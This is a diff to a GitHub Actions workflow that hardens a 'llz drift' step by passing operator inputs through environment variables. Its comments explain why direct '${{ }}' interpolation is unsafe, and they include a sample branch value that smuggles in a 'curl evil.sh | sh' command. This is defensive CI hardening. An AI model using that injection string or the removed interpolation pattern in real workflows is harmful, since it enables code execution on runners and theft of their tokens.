@@ -460,9 +460,19 @@ jobs:
           # `llz drift` resolves the head via `git ls-remote`, which needs auth
           # when the template repo is private (hence the insteadOf rewrite).
           GH_TOKEN: ${{ github.token }}
+          # VIA env:, NEVER INTERPOLATED INTO THE SCRIPT. `${{ }}` is substituted
+          # into the script BEFORE the shell parses it, so an operator-typed branch
+          # of  main"; curl evil.sh | sh #  would execute here. An env var is
+          # expanded after parsing and cannot become syntax.
+          DRIFT_BRANCH: ${{ inputs.drift_branch || 'main' }}
+          # This one expands to a literal --strict or to nothing, so it was never
+          # dangerous — it moves anyway, because a rule with exceptions is one
+          # nobody keeps and a reader cannot tell the safe case at a glance.
+          DRIFT_STRICT: ${{ (inputs.drift_strict && '--strict') || '' }}
         run: |
           git config --global \
             url."https://x-access-token:${GH_TOKEN}@github.com/".insteadOf "https://github.com/"
-          llz drift \
-            --branch "${{ inputs.drift_branch || 'main' }}" \
-            ${{ (inputs.drift_strict && '--strict') || '' }}
+          # DRIFT_STRICT is unquoted on purpose: it is a flag or empty, and must
+          # word-split away entirely when empty.
+          # shellcheck disable=SC2086
+          llz drift --branch "$DRIFT_BRANCH" $DRIFT_STRICT
